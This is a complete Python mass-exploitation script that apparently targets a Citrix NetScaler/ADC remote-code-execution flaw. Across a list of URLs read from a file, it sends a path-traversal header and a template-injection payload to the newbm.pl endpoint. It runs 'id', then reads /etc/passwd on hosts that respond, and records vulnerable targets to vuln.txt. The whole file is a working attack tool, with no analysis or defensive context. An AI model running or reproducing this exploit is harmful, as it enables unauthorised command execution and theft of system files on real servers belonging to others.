import requests
import threadpool
import urllib3
import time

urllib3.disable_warnings()
header = {
    "Proxy-Connection": "keep-alive",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://google.com",
    "NSC_NONCE": "fuck",
    "Connection": "close",
}
proxy = {       # debug
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")
        return vurl

def exp(url):
    cmd = r'''cat /etc/passwd'''
    newbm_url = url + "/vpn/../vpns/portal/scripts/newbm.pl"
    temp_name = str(time.time())
    check = "url=http://example.com\&title=[%25+template.new({'BLOCK'%3d'exec(\\'id | tee /netscaler/portal/templates/" + temp_name + "\\')%3b'})+%25]&desc=test&UI_inuse=RfWeb"
    header["NSC_USER"] = "/../../../../../../../../../../netscaler/portal/templates/" + temp_name
    try:
        req = requests.post(newbm_url, headers=header, verify=False, timeout=25, data=check, allow_redirects=False)
        if req.status_code == 200 and "uid=" in req.text:
            requests.post(newbm_url, headers=header, verify=False, timeout=25, data=check.replace("id",cmd,1), allow_redirects=False)
            print(wirte_targets(url, "vuln.txt"))
    except:
        return

def multithreading(funcname, params=[], filename="url.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")] + params
            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

def main():
    multithreading(exp, [], "url.txt", 5)      # exp的函数名，exp的多个参数值，读取的文件，线程数

if __name__ == "__main__":
    main()